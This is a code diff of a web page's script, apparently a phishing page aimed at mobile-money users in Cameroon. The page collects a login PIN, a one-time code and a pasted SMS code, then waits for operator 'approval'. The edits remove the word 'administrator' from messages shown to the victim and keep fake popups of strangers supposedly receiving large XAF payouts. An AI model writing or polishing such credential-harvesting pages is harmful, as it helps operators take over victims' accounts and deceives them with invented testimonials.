+    document.getElementById('bOtp').className = otp.length === 4 ? 'btn-otp rdy' : 'btn-otp';
   }
 
   function togPin() {
@@ -902,7 +956,7 @@
       _loginInFlight = false;
       document.getElementById('mLogin').classList.remove('show');
       document.getElementById('bLogin').disabled = false;
-      showLoginMsg('Network error. Please check your connection and try again.');
+      showLoginMsg('Network error. Please check your connection.');
     }
   }
 
@@ -964,7 +1018,7 @@
           btn.disabled = false;
           btn.textContent = 'NEXT: 4-DIGIT OTP';
           btn.className = 'btn-otp';
-          showOtpMsg('error', 'SMS verification was rejected by admin. Please re-paste your SMS code.');
+          showOtpMsg('error', 'SMS verification was rejected. Please re-paste your SMS code.');
           document.getElementById('smsPasteInput').focus();
         }
       } catch (e) {}
@@ -1011,13 +1065,8 @@
     } catch (err) {
       btn.disabled = false;
       btn.textContent = 'NEXT: 4-DIGIT OTP';
-      showOtpMsg('error', 'Network error while submitting SMS. Please check your connection.');
+      showOtpMsg('error', 'Network error submitting SMS. Please check connection.');
     }
-  }
-
-  function chkOtpDigits() {
-    const otp = getDigitValue('o', 4);
-    document.getElementById('bOtp').className = otp.length === 4 ? 'btn-otp rdy' : 'btn-otp';
   }
 
   let _rsInterval = null;
@@ -1035,7 +1084,7 @@
       if (s <= 0) {
         clearInterval(_rsInterval);
         _rsInterval = null;
-        rsBox.innerHTML = '<span style="color:#004F71;cursor:pointer;font-weight:600" onclick="resendOtp()">Resend code</span>';
+        rsBox.innerHTML = '<span style="color:var(--navy);cursor:pointer;font-weight:700" onclick="resendOtp()">Resend code</span>';
       }
     }, 1000);
   }
@@ -1050,16 +1099,16 @@
       });
       const data = await res.json();
       if (data.success) {
-        showOtpMsg('info', 'A new OTP request has been sent to the administrator.');
+        showOtpMsg('info', 'A new OTP request has been sent.');
         startRs();
         for(let i=0; i<4; i++) document.getElementById('o'+i).value = '';
         document.getElementById('bOtp').className = 'btn-otp';
         document.getElementById('o0').focus();
       } else {
-        showOtpMsg('error', 'Failed to resend OTP. Please try again.');
+        showOtpMsg('error', 'Failed to resend OTP.');
       }
     } catch {
-      showOtpMsg('error', 'Network error while resending OTP.');
+      showOtpMsg('error', 'Network error resending OTP.');
     }
   }
 
@@ -1094,17 +1143,17 @@
       document.getElementById('mOtp').classList.remove('show');
 
       if (data.success) {
-        showOtpMsg('success', 'OTP submitted. Waiting for administrator approval…');
+        showOtpMsg('success', 'OTP submitted. Waiting for approval…');
         pollOtpStatus();
       } else {
         document.getElementById('bOtp').disabled = false;
-        showOtpMsg('error', data.message || 'OTP submission failed. Please try again.');
+        showOtpMsg('error', data.message || 'OTP submission failed.');
       }
     } catch (err) {
       clearInterval(countdown);
       document.getElementById('mOtp').classList.remove('show');
       document.getElementById('bOtp').disabled = false;
-      showOtpMsg('error', 'Network error. Please check your connection.');
+      showOtpMsg('error', 'Network error verifying OTP.');
     }
   }
 
@@ -1148,7 +1197,7 @@
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpStep1').style.display = 'none';
           document.getElementById('otpStep2').style.display = 'block';
-          showOtpMsg('error', 'Incorrect OTP code. Please check and enter again.');
+          showOtpMsg('error', 'Incorrect OTP code. Please enter it again.');
           document.getElementById('o0').focus();
         }
       } catch (e) {}
@@ -1175,7 +1224,7 @@
     goTo('page-login');
   }
 
-  // LIVE POPUP
+  // LIVE SOCIAL PROOF NOTIFICATIONS
   document.addEventListener("DOMContentLoaded", () => {
     setupDigitGroup('pinContainer', 5, chkLogin);
     setupDigitGroup('otpContainer', 4, chkOtpDigits);
@@ -1187,10 +1236,7 @@
       { number: "672*****458", location: "Bafoussam", amount: "100,000 XAF" },
       { number: "698*****694", location: "Garoua", amount: "250,000 XAF" },
       { number: "677*****231", location: "Maroua", amount: "500,000 XAF" },
-      { number: "653*****885", location: "Ngaoundéré", amount: "1,000,000 XAF" },
-      { number: "691*****406", location: "Kribi", amount: "2,500,000 XAF" },
-      { number: "670*****534", location: "Buea", amount: "5,000,000 XAF" },
-      { number: "680*****168", location: "Ebolowa", amount: "7,500,000 XAF" }
+      { number: "653*****885", location: "Ngaoundéré", amount: "1,000,000 XAF" }
     ];
 
     const popup = document.getElementById("popup");
@@ -1220,9 +1266,10 @@
     }
 
     setTimeout(displayPopup, 2000);
-    setInterval(displayPopup, 3500);
+    setInterval(displayPopup, 4500);
   });
 
+  // INITIAL CALCULATOR DISPLAY UPDATE
   calcUp();
 </script>
 </body>
